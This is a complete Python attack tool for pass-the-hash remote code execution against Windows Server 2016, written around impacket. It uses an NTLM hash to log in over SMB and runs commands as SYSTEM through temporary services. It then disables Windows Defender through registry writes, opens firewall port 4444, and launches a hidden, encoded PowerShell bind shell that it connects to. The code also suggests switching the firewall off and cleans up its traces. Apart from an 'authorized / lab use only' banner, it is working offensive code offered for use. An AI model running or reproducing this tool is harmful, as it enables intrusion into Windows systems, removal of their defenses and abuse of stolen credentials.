#!/usr/bin/env python3
"""
Pass-the-Hash Remote Shell - Full & Optimized for Windows Server 2016
2-Stage: Stage 1 disables Defender via registry, Stage 2 deploys TCP bind shell
Authorized / lab use only.
"""

import sys
import io
import signal
import time
import subprocess
import random
import string
import os
import socket
import threading
import base64
from typing import Optional

# Force UTF-8 output on Windows
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

def cprint(text: str, color: str = "WHITE", bold: bool = False):
    prefix = Colors.BOLD if bold else ""
    color_code = getattr(Colors, color, Colors.WHITE)
    print(f"{prefix}{color_code}{text}{Colors.RESET}")

# ─────────────────────────────────────────────
#  SIGNAL HANDLER
# ─────────────────────────────────────────────
_shell_instance = None
_in_command     = False
_stop_command   = False

def signal_handler(sig, frame):
    global _in_command, _stop_command
    if _in_command:
        cprint("\n  [!] Command interrupted...", "YELLOW")
        _in_command   = False
        _stop_command = True
        return
    cprint("\n[!] Interrupted by user (Ctrl+C).", "RED")
    if _shell_instance:
        try:
            _shell_instance.cleanup()
        except Exception:
            pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────
def is_reachable(target: str) -> bool:
    if not target:
        return False
    cmd = ["ping", "-n", "1", "-w", "2000", target] if os.name == "nt" \
          else ["ping", "-c", "1", "-W", "2", target]
    try:
        return subprocess.run(cmd, capture_output=True, timeout=4).returncode == 0
    except Exception:
        return False

def normalize_hash(raw: str) -> Optional[str]:
    """
    Accept NT hash in multiple formats:
      - plain 32-hex
      - LM:NT
      - pwdump (user:rid:lm:nt:::)
    """
    if not raw:
        return None
    raw = raw.strip()
    # pwdump format
    parts = raw.split(":")
    if len(parts) >= 4:
        candidate = parts[3].strip().lower()
        if len(candidate) == 32 and all(c in "0123456789abcdef" for c in candidate):
            return candidate
    # LM:NT or plain
    if ":" in raw:
        raw = raw.rsplit(":", 1)[-1]
    raw = raw.strip().lower()
    if len(raw) == 32 and all(c in "0123456789abcdef" for c in raw):
        return raw
    return None

def _extract_share(full_path: str) -> str:
    """C:\\Windows\\... → C$,  D:\\... → D$"""
    p = full_path.replace("/", "\\")
    if len(p) >= 2 and p[1] == ":":
        return p[0].upper() + "$"
    return "C$"

# ═════════════════════════════════════════════════════════════════════
#  REMOTE SHELL CLASS
# ═════════════════════════════════════════════════════════════════════

class RemoteShell:
    LMHASH   = "aad3b435b51404eeaad3b435b51404ee"
    TMP_DIR  = "C:\\Windows\\Temp"
    WAIT_MAX = 60
    READ_MAX = 10 * 1024 * 1024   # 10 MB cap

    def __init__(self, target: str, username: str, domain: str, nthash: str):
        self.target      = target
        self.username    = username
        self.domain      = domain
        self.nthash      = nthash
        self._smb        = None
        self._dce        = None
        self._scm        = None
        self._cwd        = "C:\\"
        self._cleaned    = False
        self._read_chunk = 65535

    def _rand(self, n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=n))

    def _tmp(self, ext: str) -> str:
        return f"{self.TMP_DIR}\\pth_{self._rand()}.{ext}"

    def _smb_path(self, full_path: str) -> str:
        """Strip drive letter for SMB share access."""
        p = full_path.replace("/", "\\")
        if len(p) >= 2 and p[1] == ":":
            p = p[2:]
        return p.lstrip("\\")

    # ── Connection ───────────────────────────────────────────────────
    def _ensure_connected(self):
        if self._smb is None:
            cprint("  [!] Not connected — reconnecting...", "YELLOW")
            self.connect()

    def connect(self):
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, scmr

        self._close_transport()
        self._cleaned = False

        cprint(f"  [*] Connecting to {self.target} ...", "CYAN")
        try:
            self._smb = SMBConnection(
                self.target, self.target, sess_port=445, timeout=120
            )
        except Exception as e:
            self._smb = None
            raise ConnectionError(f"SMB connection failed: {e}") from e

        try:
            self._smb.login(
                self.username, "", self.domain,
                lmhash=self.LMHASH, nthash=self.nthash
            )
        except Exception as e:
            self._close_transport()
            raise PermissionError(f"SMB auth failed: {e}") from e

        cprint("  [+] SMB authenticated via PTH", "GREEN")

        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r"\svcctl", smb_connection=self._smb
            )
            self._dce = rpctransport.get_dce_rpc()
            self._dce.connect()
            self._dce.bind(scmr.MSRPC_UUID_SCMR)
            self._scm = scmr.hROpenSCManagerW(self._dce)["lpScHandle"]
        except Exception as e:
            self._close_transport()
            raise ConnectionError(f"SCMR bind failed: {e}") from e

        cprint("  [+] SCMR bound — ready", "GREEN")

    def _close_transport(self):
        try:
            from impacket.dcerpc.v5 import scmr as _scmr
            if self._scm and self._dce:
                _scmr.hRCloseServiceHandle(self._dce, self._scm)
        except Exception:
            pass
        try:
            if self._dce:
                self._dce.disconnect()
        except Exception:
            pass
        try:
            if self._smb:
                self._smb.logoff()
        except Exception:
            pass
        self._smb = self._dce = self._scm = None

    def reconnect(self, max_retries: int = 3) -> bool:
        for attempt in range(1, max_retries + 1):
            if not is_reachable(self.target):
                cprint(f"  [!] Target unreachable (attempt {attempt})", "RED")
                time.sleep(2)
                continue
            try:
                cprint(f"  [*] Reconnect attempt {attempt}/{max_retries}...", "YELLOW")
                self.connect()
                cprint("  [+] Reconnected!", "GREEN")
                return True
            except Exception as e:
                cprint(f"  [!] Failed: {e}", "RED")
                time.sleep(2)
        return False

    # ── SMB File Operations ───────────────────────────────────────────
    def _smb_write(self, full_path: str, data: bytes):
        self._ensure_connected()
        share      = _extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = fid = None
        try:
            tid = self._smb.connectTree(share)
            fid = self._smb.createFile(
                tid, share_path,
                desiredAccess=0x40000000,
                shareMode=0x7,
                creationDisposition=0x2,
                fileAttributes=0x80,
                impersonationLevel=0x2
            )
            self._smb.writeFile(tid, fid, data)
        finally:
            if fid is not None:
                try: self._smb.closeFile(tid, fid)
                except Exception: pass
            if tid is not None:
                try: self._smb.disconnectTree(tid)
                except Exception: pass

    def _smb_read(self, full_path: str) -> bytes:
        self._ensure_connected()
        share      = _extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = fid = None
        try:
            tid = self._smb.connectTree(share)
            fid = self._smb.openFile(
                tid, share_path,
                desiredAccess=0x80000000,
                shareMode=0x7,
                creationDisposition=0x3
            )
            buf = b""
            offset = 0
            while True:
                chunk = self._smb.readFile(
                    tid, fid, offset=offset, bytesToRead=self._read_chunk
                )
                if not chunk:
                    break
                buf += chunk
                offset += len(chunk)
                if len(buf) >= self.READ_MAX:
                    cprint("  [!] Output truncated (>10 MB)", "YELLOW")
                    break
            return buf
        finally:
            if fid is not None:
                try: self._smb.closeFile(tid, fid)
                except Exception: pass
            if tid is not None:
                try: self._smb.disconnectTree(tid)
                except Exception: pass

    def _smb_delete(self, full_path: str):
        if self._smb is None:
            return
        share      = _extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = None
        try:
            tid = self._smb.connectTree(share)
            self._smb.deleteFiles(tid, share_path)
        except Exception:
            pass
        finally:
            if tid is not None:
                try: self._smb.disconnectTree(tid)
                except Exception: pass

    def _decode(self, raw: bytes) -> str:
        for enc in ("utf-8", "cp850", "cp1252", "latin-1"):
            try:
                return raw.decode(enc)
            except (UnicodeDecodeError, LookupError):
                continue
        return raw.decode("ascii", errors="replace")

    # ── Run Command (with output) ─────────────────────────────────────
    def run(self, cmd: str) -> str:
        global _in_command
        if not isinstance(cmd, str) or not cmd.strip():
            return ""
        _in_command = True
        try:
            return self._run_internal(cmd)
        except Exception as e:
            cprint(f"  [!] Error: {e}", "RED")
            if self.reconnect():
                try:
                    return self._run_internal(cmd)
                except Exception as e2:
                    cprint(f"  [!] Retry failed: {e2}", "RED")
            return f"Command failed: {e}"
        finally:
            _in_command = False

    def _run_internal(self, cmd: str) -> str:
        global _stop_command
        from impacket.dcerpc.v5 import scmr
        self._ensure_connected()

        bat_path = self._tmp("bat")
        out_path = self._tmp("txt")
        svc_name = "pth_" + self._rand(10)

        # FIX: output redirection INSIDE the bat — avoids quoting/path issues
        bat_content = (
            "@echo off\r\n"
            f"cd /d \"{self._cwd}\"\r\n"
            "(\r\n"
            f"{cmd}\r\n"
            f") > \"{out_path}\" 2>&1\r\n"
        ).encode("utf-8")

        # FIX: service binary uses %COMSPEC% wrapped in quotes
        # %COMSPEC% expands correctly when the bat file is already on disk
        svc_binary = f"C:\\Windows\\System32\\cmd.exe /Q /c \"{bat_path}\""

        svc_handle = None
        try:
            self._smb_write(bat_path, bat_content)

            # Create service
            try:
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]
            except Exception:
                try:
                    old = scmr.hROpenServiceW(
                        self._dce, self._scm, svc_name
                    )["lpServiceHandle"]
                    scmr.hRDeleteService(self._dce, old)
                    scmr.hRCloseServiceHandle(self._dce, old)
                except Exception:
                    pass
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]

            # Start service
            try:
                scmr.hRStartServiceW(self._dce, svc_handle)
            except Exception as e:
                s = str(e)
                if "ERROR_SERVICE_REQUEST" not in s and \
                   "ERROR_SERVICE_SPECIFIC" not in s and \
                   "1053" not in s:
                    cprint(f"  [!] Service start warning: {e}", "YELLOW")

            # Poll SERVICE_STOPPED state
            SERVICE_STOPPED = 1
            start_time  = time.time()
            deadline    = start_time + self.WAIT_MAX
            timed_out   = True
            _stop_command = False
            shown_wait  = False

            while time.time() < deadline:
                if _stop_command:
                    timed_out = False
                    break
                try:
                    resp  = scmr.hRQueryServiceStatus(self._dce, svc_handle)
                    state = resp["lpServiceStatus"]["dwCurrentState"]
                    if state == SERVICE_STOPPED:
                        timed_out = False
                        break
                except Exception:
                    timed_out = False
                    break

                if not shown_wait and (time.time() - start_time) >= 1.0:
                    print("  ⏳ Running...", end="\r", flush=True)
                    shown_wait = True
                time.sleep(0.4)

            if shown_wait:
                print(" " * 20, end="\r", flush=True)

            if timed_out:
                cprint("  [!] Command timed out", "YELLOW")

            time.sleep(0.3)

            try:
                raw    = self._smb_read(out_path)
                return self._decode(raw).strip()
            except Exception as e:
                if "STATUS_OBJECT_NAME_NOT_FOUND" not in str(e):
                    cprint(f"  [!] Output read error: {e}", "YELLOW")
                return ""

        finally:
            try:
                if svc_handle:
                    scmr.hRDeleteService(self._dce, svc_handle)
                    scmr.hRCloseServiceHandle(self._dce, svc_handle)
            except Exception:
                pass
            self._smb_delete(bat_path)
            self._smb_delete(out_path)

    # ── Run Detached (fire and forget — for bind shell) ───────────────
    def run_detach(self, cmd: str):
        """
        Start a command via SCM service and return immediately.
        Uses 'start "" ...' inside the bat to detach from SCM timeout.
        """
        from impacket.dcerpc.v5 import scmr
        self._ensure_connected()

        bat_path = self._tmp("bat")
        svc_name = "pth_" + self._rand(10)

        bat_content = (
            "@echo off\r\n"
            f"cd /d \"{self._cwd}\"\r\n"
            f"{cmd}\r\n"
        ).encode("utf-8")

        svc_binary = f"C:\\Windows\\System32\\cmd.exe /Q /c \"{bat_path}\""

        svc_handle = None
        try:
            self._smb_write(bat_path, bat_content)

            try:
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]
            except Exception:
                try:
                    old = scmr.hROpenServiceW(
                        self._dce, self._scm, svc_name
                    )["lpServiceHandle"]
                    scmr.hRDeleteService(self._dce, old)
                    scmr.hRCloseServiceHandle(self._dce, old)
                except Exception:
                    pass
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]

            try:
                scmr.hRStartServiceW(self._dce, svc_handle)
            except Exception:
                pass  # Expected — process detaches immediately

        except Exception as e:
            cprint(f"  [!] run_detach failed: {e}", "RED")
        finally:
            try:
                if svc_handle:
                    scmr.hRDeleteService(self._dce, svc_handle)
                    scmr.hRCloseServiceHandle(self._dce, svc_handle)
            except Exception:
                pass
            # Wait before deleting — let SCM read the bat before cleanup
            time.sleep(2)
            self._smb_delete(bat_path)

    # ── Cleanup ───────────────────────────────────────────────────────
    def cleanup(self):
        if self._cleaned:
            return
        self._cleaned = True
        self._close_transport()
        cprint("  [+] Session cleaned up", "GREEN")


# ─────────────────────────────────────────────
#  STAGE 1 — DISABLE DEFENDER VIA REGISTRY
# ─────────────────────────────────────────────
def disable_defender(shell: RemoteShell) -> bool:
    """
    Disable Windows Defender and firewall via HKLM registry writes.
    These run under SYSTEM context via the service — HKCU is NOT available.
    """
    strategies = [
        (
            "Disable AntiSpyware (Group Policy)",
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
            '/v DisableAntiSpyware /t REG_DWORD /d 1 /f'
        ),
        (
            "Disable Real-Time Monitoring (Group Policy)",
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" '
            '/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
        ),
        (
            "Disable Behavior Monitoring",
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" '
            '/v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
        ),
        (
            "Disable Script Scanning",
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" '
            '/v DisableScriptScanning /t REG_DWORD /d 1 /f'
        ),
        (
            "Open inbound firewall port 4444",
            'netsh advfirewall firewall add rule name="pth_bind" '
            'dir=in action=allow protocol=TCP localport=4444 enable=yes'
        ),
        (
            "Open inbound firewall port 4444 (profile all)",
            'netsh advfirewall firewall add rule name="pth_bind2" '
            'dir=in action=allow protocol=TCP localport=4444 '
            'enable=yes profile=any'
        ),
    ]

    any_success = False
    for name, cmd in strategies:
        cprint(f"  [*] {name}...", "CYAN")
        try:
            result = shell.run(cmd)
            lowered = (result or "").lower()
            if "denied" in lowered or "failed" in lowered or "error" in lowered:
                cprint(f"  [!] {name} → {result.strip()[:80]}", "YELLOW")
            else:
                cprint(f"  [+] {name} → OK", "GREEN")
                any_success = True
        except Exception as e:
            cprint(f"  [!] {name} → {e}", "YELLOW")

    return any_success


# ─────────────────────────────────────────────
#  STAGE 2 — BIND SHELL PAYLOAD
# ─────────────────────────────────────────────
def generate_bind_payload(lport: int) -> str:
    """
    Generate a base64-encoded PowerShell TCP bind shell.
    The target opens lport and waits for our connection.
    """
    # FIX: use explicit [System.Net.IPAddress]::Any instead of 0.0.0.0 string
    # FIX: add error handling around listener so PS doesn't crash on port conflict
    inner = (
        "$ErrorActionPreference='SilentlyContinue';"
        "try{"
        f"$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{lport});"
        "$l.Start();"
        "$c=$l.AcceptTcpClient();"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);"
        "$s.Flush()};"
        "$c.Close();$l.Stop()"
        "}catch{}"
    )
    return base64.b64encode(inner.encode("utf-16le")).decode()


def deploy_bind_shell(shell: RemoteShell, lport: int):
    """
    Deploy the bind shell via SCM service and connect to it.
    """
    cprint(f"\n[*] Deploying bind shell on port {lport}...", "CYAN")

    b64 = generate_bind_payload(lport)

    # FIX: use 'start "" /B powershell' to fully detach from SCM
    # /B = don't create new window, detached from parent
    cmd = (
        f'start "" /B powershell.exe -WindowStyle Hidden '
        f'-NoProfile -ExecutionPolicy Bypass '
        f'-EncodedCommand {b64}'
    )

    # Deploy in background thread — don't wait for it
    cprint("[*] Launching bind shell via SCM (background)...", "CYAN")
    t = threading.Thread(target=shell.run_detach, args=(cmd,), daemon=True)
    t.start()

    # FIX: wait longer for PS to start — WS2016 is slow to spawn PS under SYSTEM
    cprint(f"[*] Waiting for target to open port {lport} (max 45s)...", "CYAN")

    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.settimeout(2.0)

    deadline   = time.time() + 45
    connected  = False
    dots       = 0

    while time.time() < deadline:
        try:
            conn.connect((shell.target, lport))
            connected = True
            break
        except (ConnectionRefusedError, socket.timeout, OSError):
            dots += 1
            print(f"  ⏳ Waiting{'.' * (dots % 4)}   ", end="\r", flush=True)
            time.sleep(1.5)

    print(" " * 30, end="\r")

    if not connected:
        cprint("\n[!] Connection timed out — bind shell did not open.", "RED")
        cprint("    Possible causes:", "YELLOW")
        cprint("    1. Windows Firewall is blocking port 4444", "YELLOW")
        cprint("    2. Defender killed the PowerShell process", "YELLOW")
        cprint("    3. Stage 1 registry changes need a reboot to take effect", "YELLOW")
        cprint("\n    → To disable firewall manually, run on Windows Server:", "CYAN")
        cprint('      netsh advfirewall set allprofiles state off', "WHITE")
        conn.close()
        return

    cprint(f"\n[+] Connected to bind shell on {shell.target}:{lport}!", "GREEN", bold=True)
    cprint("    Type commands — you have a SYSTEM PowerShell shell", "GREEN")
    cprint("    Type 'exit' to close\n", "YELLOW")
    conn.settimeout(None)

    # ── Receive thread ────────────────────────────────────────────────
    def recv_loop():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode("ascii", errors="replace"), end="", flush=True)
            except OSError as e:
                if "10054" in str(e) or getattr(e, "winerror", None) == 10054:
                    cprint("\n[!] WinError 10054 — connection forcibly closed.", "RED")
                    cprint("    Defender likely killed the PowerShell process.", "YELLOW")
                    cprint("    Run Stage 1 again or disable firewall manually.", "YELLOW")
                else:
                    cprint(f"\n[!] Socket error: {e}", "RED")
                break
            except Exception:
                break
        cprint("\n[!] Bind shell connection closed.", "RED")
        os._exit(0)

    threading.Thread(target=recv_loop, daemon=True).start()

    # ── Send loop ─────────────────────────────────────────────────────
    while True:
        try:
            line = sys.stdin.readline()
            if not line:
                break
            conn.sendall(line.encode("ascii", errors="replace"))
        except KeyboardInterrupt:
            conn.sendall(b"exit\n")
            time.sleep(0.5)
            break
        except Exception:
            break

    conn.close()


# ─────────────────────────────────────────────
#  INTERACTIVE SMB SHELL (fallback)
# ─────────────────────────────────────────────
def interactive_shell(shell: RemoteShell):
    global _shell_instance, _in_command
    _shell_instance = shell

    cprint("\n[+] SMB Shell ready", "GREEN", bold=True)
    cprint("    Commands execute on target via PTH", "GREEN")
    cprint("    'bindshell <port>' — deploy TCP bind shell", "CYAN")
    cprint("    'stage1'           — disable Defender/firewall", "CYAN")
    cprint("    'help'             — show commands", "GREEN")
    cprint("    'exit'             — quit\n", "YELLOW")
    cprint("─" * 60, "YELLOW")

    while True:
        try:
            cmd = input(
                f"{Colors.GREEN}shell [{shell._cwd}]> {Colors.RESET}"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            cprint("\n[!] Exiting.", "YELLOW")
            break

        if not cmd:
            continue

        if cmd.lower() in ("exit", "quit", "q"):
            break

        if cmd.lower() == "help":
            cprint("\n  Built-in commands:", "YELLOW", bold=True)
            cprint("    cd <path>           change directory", "WHITE")
            cprint("    stage1              disable Defender + open firewall", "WHITE")
            cprint("    bindshell [port]    deploy TCP bind shell (default 4444)", "WHITE")
            cprint("    selftest            verify execution pipeline", "WHITE")
            cprint("    exit                close shell", "WHITE")
            cprint("  All other input → sent as Windows command\n", "CYAN")
            continue

        if cmd.lower() == "selftest":
            out = shell.run("echo PTH_OK && whoami")
            if "PTH_OK" in out:
                cprint("  [+] Execution pipeline working!", "GREEN")
                print(out)
            else:
                cprint(f"  [!] Unexpected output: {repr(out)}", "RED")
            continue

        if cmd.lower() == "stage1":
            cprint("\n[*] Running Stage 1 — disabling defenses...", "CYAN")
            ok = disable_defender(shell)
            if ok:
                cprint("[+] Stage 1 complete!", "GREEN")
            else:
                cprint("[!] Stage 1 inconclusive.", "YELLOW")
            continue

        if cmd.lower().startswith("bindshell"):
            parts = cmd.split()
            port  = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 4444
            deploy_bind_shell(shell, port)
            continue

        # cd handling
        if cmd.lower().startswith("cd"):
            parts = cmd.split(None, 1)
            if len(parts) == 2:
                new_dir = parts[1].strip()
                try:
                    _in_command = True
                    out = shell.run(
                        f"cd /d \"{new_dir}\" & "
                        f"if errorlevel 1 (echo __CDFAIL__) else (cd)"
                    )
                finally:
                    _in_command = False

                if "__CDFAIL__" in out:
                    cprint("  [!] Directory not found", "RED")
                else:
                    lines = [l.strip() for l in out.splitlines() if l.strip()]
                    if lines:
                        shell._cwd = lines[-1]
                        cprint(f"  [*] cwd → {shell._cwd}", "CYAN")
            else:
                cprint(f"  cwd: {shell._cwd}", "WHITE")
            continue

        # Regular command
        try:
            _in_command = True
            output = shell.run(cmd)
        except Exception as e:
            cprint(f"  [!] Error: {e}", "RED")
            continue
        finally:
            _in_command = False

        print(output) if output else cprint("  (no output)", "YELLOW")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    cprint("╔══════════════════════════════════════════════════════╗", "CYAN", bold=True)
    cprint("║  Pass-the-Hash Shell + Bind Shell  |  WS 2016       ║", "CYAN", bold=True)
    cprint("║  Stage 1: Disable Defender  |  Stage 2: Bind Shell  ║", "CYAN", bold=True)
    cprint("║              Authorized / Lab Use Only               ║", "YELLOW", bold=True)
    cprint("╚══════════════════════════════════════════════════════╝\n", "CYAN", bold=True)

    if input("Continue? [y/N] ").strip().lower() not in ("y", "yes"):
        return

    # Inputs
    domain = input(f"  {Colors.CYAN}Domain (or . for local) → {Colors.RESET}").strip() or "."

    while True:
        username = input(f"  {Colors.CYAN}Username                → {Colors.RESET}").strip()
        if username: break
        cprint("  [!] Username cannot be empty.", "YELLOW")

    while True:
        target = input(f"  {Colors.CYAN}Target IP/Hostname      → {Colors.RESET}").strip()
        if target: break
        cprint("  [!] Target cannot be empty.", "YELLOW")

    while True:
        raw = input(f"  {Colors.CYAN}NTLM Hash               → {Colors.RESET}").strip()
        nthash = normalize_hash(raw)
        if nthash: break
        cprint("  [!] Invalid hash — must be 32 hex chars (or LM:NT format)", "YELLOW")

    cprint("\n┌─ Summary ───────────────────────────────────────────┐", "GREEN")
    cprint(f"  │  Domain   : {domain}", "WHITE")
    cprint(f"  │  User     : {username}", "WHITE")
    cprint(f"  │  Target   : {target}", "WHITE")
    cprint(f"  │  NT Hash  : {nthash[:8]}...{nthash[-8:]}", "WHITE")
    cprint("  └─────────────────────────────────────────────────────┘\n", "GREEN")

    shell = RemoteShell(target, username, domain, nthash)
    try:
        shell.connect()

        # Quick selftest
        cprint("[*] Verifying execution pipeline...", "CYAN")
        out = shell.run("echo PTH_SELFTEST_OK")
        if "PTH_SELFTEST_OK" in out:
            cprint("[+] Execution pipeline OK!\n", "GREEN")
        else:
            cprint(f"[!] Selftest unexpected output: {repr(out)}", "YELLOW")
            cprint("    Proceeding anyway...\n", "YELLOW")

        interactive_shell(shell)

    except Exception as e:
        cprint(f"\n[!] Failed: {e}", "RED")
        import traceback
        traceback.print_exc()
    finally:
        cprint("\n[*] Cleaning up...", "CYAN")
        shell.cleanup()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted.", "RED")
        sys.exit(1)
